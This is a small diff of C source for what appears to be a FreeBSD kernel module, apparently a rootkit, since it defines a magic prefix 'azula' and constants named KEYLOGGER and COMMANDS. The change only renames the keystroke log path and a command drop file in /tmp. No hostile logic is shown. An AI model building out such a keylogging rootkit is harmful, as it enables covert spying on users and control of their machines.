@@ -41,8 +41,8 @@
 #define VERBOSE 0
 
 #define MAGIC_PREFIX "azula"
-#define KEYLOGGER "/var/log/test"
-#define COMMANDS "/tmp/cmd.txt" //Come back for this
+#define KEYLOGGER "/var/log/azula"
+#define COMMANDS "/tmp/azula" //Come back for this
 
 MALLOC_DECLARE(M_TEMPBUFFER);
 MALLOC_DEFINE(M_TEMPBUFFER, "SHORT DESCRIP", "LONG DESCRIP");
